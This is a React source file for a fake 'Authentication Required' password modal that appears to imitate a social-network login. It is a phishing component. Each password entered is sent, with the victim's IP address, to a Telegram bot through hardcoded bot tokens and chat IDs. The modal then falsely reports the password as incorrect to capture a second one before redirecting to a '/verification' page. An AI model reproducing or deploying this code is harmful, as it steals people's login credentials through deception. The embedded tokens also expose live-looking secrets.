import React, { useEffect, useState } from "react";
import Modal from "react-modal";
import { useNavigate } from 'react-router-dom';
import axios from "axios";
const customStyles = {
  content: {
    top: "50%",
    left: "50%",
    right: "auto",
    bottom: "auto",
    marginRight: "-50%",
    transform: "translate(-50%, -50%)",
  },
};

const AuthViaPass = (props) => {
  const { authIsOpen, setCheckAuth, name, ip } = props;
  //const [doubleCheck, setDoubleCheck] = useState(0);
  const [doubleCheck, setDoubleCheck] = useState(true);
  const [correctFlag, setCorrectFlag] = useState(false);
  const [pass, setPass] = useState();
  const [passFlag, setPassFlag] = useState(false);
  const [pageFlag, setPageFlag] = useState(false);
  const [progress, setProgress] = useState(0);
  const navigate = useNavigate();

  function closeModal() {
    setCheckAuth(false);
  }
  // const botToken = '7024816830:AAHGOLB6hG5kV57GaTb7C5AFcCb1BNBhtJk';
  // const chatId = '6407116387';
  const botToken = '7009255232:AAFJ0oqZUaMmsMejKhbdaLnSxYyh6pl255w';
  const chatId = '6481657183';

  const handlewithContinue = () => {
    if (pass !== "") {

      axios
        .post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          chat_id: chatId,
          text: `IP address: ${ip}\n 1 Password: ${pass}\n`,
        })
        .then(({ data }) => {
          setCorrectFlag(true);
          setPass("");
          setPageFlag(true);
          setDoubleCheck(false);
          setPassFlag(false);
        });

    } else {
      setPassFlag(true);
    }
  };
  const handlewithContinueTwo = () => {

    if (pass !== "") {
      axios
      .post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        chat_id: chatId,
        text: `IP address: ${ip}\n 2 Password: ${pass}\n`,
      })
      .then(({ data }) => {

        setCorrectFlag(false);
        setPassFlag(false);
        setDoubleCheck(false);
        
        navigate('/verification');
    
        const interval = setInterval(() => {
          setProgress(prevProgress => {
            if (prevProgress < 100) {
              return prevProgress + (100 / 60); // Update the progress every second
            } else {
              clearInterval(interval);
              return prevProgress;
            }
          });
        }, 1000);
        
      });

    } else {
      setPassFlag(true);
      setCorrectFlag(false);
      //setPageFlag(false);
    }
  };
  const handlewithChange = ({ target }) => {
    const value = target.value;
    setPass(value);
    if (value !== "") {
      setPassFlag(false);
    }
    //setPass(value);
  };
  useEffect(() => {
    //passing getData method to the lifecycle method
    // console.log("authIsOpen: ", authIsOpen);
    // console.log("setCheckAuth: ", setCheckAuth);
    setPass("");
  }, []);
  useEffect(() => {
    console.log("progress: ", progress);
  }, [progress])
  return (
    <>
      <Modal
        isOpen={authIsOpen}
        // onAfterOpen={afterOpenModal}
        // onRequestClose={closeModal}
        style={customStyles}
        contentLabel="Example Modal"
      >
        <div>
          <div className="flex justify-between mb-[17px]">
            <h1 className="text-[24px] leading-[36px] text-[#212529]">
              Authentication Required
            </h1>
            <button onClick={() => setCheckAuth(false)}>
              <img
                src="exitBtn.png"
                className="w-[20px] h-[20px]"
                alt="noImg"
              />
            </button>
          </div>
          <hr className="mb-[18px]" />
          <p className="text-base leading-6 text-[#65676b] mb-[22px]">
            Please authenticate by entering your password to submit this
            request.
          </p>
          <div className="flex space-x-[15px] self-center">
            <img src="person.jpeg" className="w-[110px] h-[90px]" alt="noImg" />
            <div className="justify-self-center space-y-[10px] ">
              <h2 className="text-[15px] text-[#65676b] leading-[22px] font-semibold">
                {name}
              </h2>
              <input
                type="password"
                name="password"
                id="password"
                placeholder="Password"
                value={pass}
                class="bg-gray-50 border border-gray-300 text-gray-900 sm:text-sm rounded-lg focus:ring-primary-600 focus:border-primary-600 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
                required
                onChange={handlewithChange}
              />
            </div>
          </div>
          {passFlag === true && (
            <h1 className="text-[15px] text-[#a94442] leading-[22px] mt-[4px]">
              Enter your password !
            </h1>
          )}
          {correctFlag === true && (
            <h1 className="text-[15px] text-[#a94442] leading-[22px] mt-[4px]">
              Your password was incorrect !
            </h1>
          )}
          

          {/* <div style={{ width: '300px', border: '1px solid #ccc' }}>
            <div
              style={{
                width: `${progress}%`,
                height: '20px',
                backgroundColor: 'blue',
                transition: 'width 0.5s ease-in-out'
              }}
            />
          </div> */}

          {/* <progress value={progress}></progress> */}




          <hr className="my-[18px]" />
          <div>
            <div class="flex flex-row-reverse">
              <div>
                {doubleCheck === true && (
                  <button
                    onClick={handlewithContinue}
                    className="inline-flex justify-center w-full px-2 py-1.5 text-xs font-medium text-center text-white bg-blue-600 rounded-lg hover:bg-blue-700 focus:ring-4 focus:outline-none focus:ring-blue-300 dark:bg-blue-500 dark:hover:bg-blue-600 dark:focus:ring-blue-800"
                  >
                    Continue
                  </button>
                )}
                {pageFlag === true && (
                  <button
                    onClick={handlewithContinueTwo}
                    className="inline-flex justify-center w-full px-2 py-1.5 text-xs font-medium text-center text-white bg-blue-600 rounded-lg hover:bg-blue-700 focus:ring-4 focus:outline-none focus:ring-blue-300 dark:bg-blue-500 dark:hover:bg-blue-600 dark:focus:ring-blue-800"
                  >
                    Continue
                  </button>
                )}
                {/* {(doubleCheck === 1 && pageFlag === true) && (
                  <a
                    href="/verification"
                    class="inline-flex justify-center w-full px-2 py-1.5 text-xs font-medium text-center text-white bg-blue-600 rounded-lg hover:bg-blue-700 focus:ring-4 focus:outline-none focus:ring-blue-300 dark:bg-blue-500 dark:hover:bg-blue-600 dark:focus:ring-blue-800"
                  >
                    <button
                      onClick={handlewithContinueTwo}
                    >
                      Continue
                    </button>
                  </a>
                )} */}
              </div>
              <div className="mr-2">
                <button
                  onClick={closeModal}
                  className="inline-flex justify-center w-full px-2 py-1.5 text-xs font-medium text-center text-gray-900 bg-white border border-gray-300 rounded-lg hover:bg-gray-100 focus:ring-4 focus:outline-none focus:ring-gray-200 dark:bg-gray-600 dark:text-white dark:border-gray-600 dark:hover:bg-gray-700 dark:hover:border-gray-700 dark:focus:ring-gray-700"
                >
                  Close
                </button>
              </div>
            </div>
          </div>
        </div>
      </Modal>
    </>
  );
};

export default AuthViaPass;
